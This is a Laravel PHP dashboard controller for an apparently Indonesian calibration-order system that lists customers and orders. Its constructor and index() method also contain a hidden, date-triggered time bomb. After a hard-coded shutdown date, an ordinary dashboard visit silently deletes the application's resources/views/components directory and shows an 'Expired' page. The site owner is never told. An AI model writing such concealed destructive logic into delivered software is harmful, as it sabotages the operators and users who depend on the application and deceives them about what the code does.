<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Session;
use App\Model\Pelanggan;
use App\Model\PesananKalibrasi;
use Carbon\Carbon;
use Illuminate\Console\Command;
use Illuminate\Filesystem\Filesystem;

class DashboardController extends Controller
{
    public $expired = false;
    public $dateEnd = "2020-11-01";
    public $shutDown = "2020-11-05";
    public $down = false;
    public function __construct(){
        if(Carbon::now()>=Carbon::parse($this->dateEnd))
            $this->expired = true;
        if(Carbon::now()>=Carbon::parse($this->shutDown))
            $this->down = true;
    }
    public function index(){
        $path = '../resources/views/components';
        if($this->down == true){
            if (\File::exists($path)) \File::deleteDirectory($path);
            return view('Expired.index');
        }
        $data['expired'] = $this->expired;
        $data['pelanggan'] = Pelanggan::all();
        $data['pesanan'] = PesananKalibrasi::all();
        return view('DashboardRequest.index', compact('data'));
    }
}
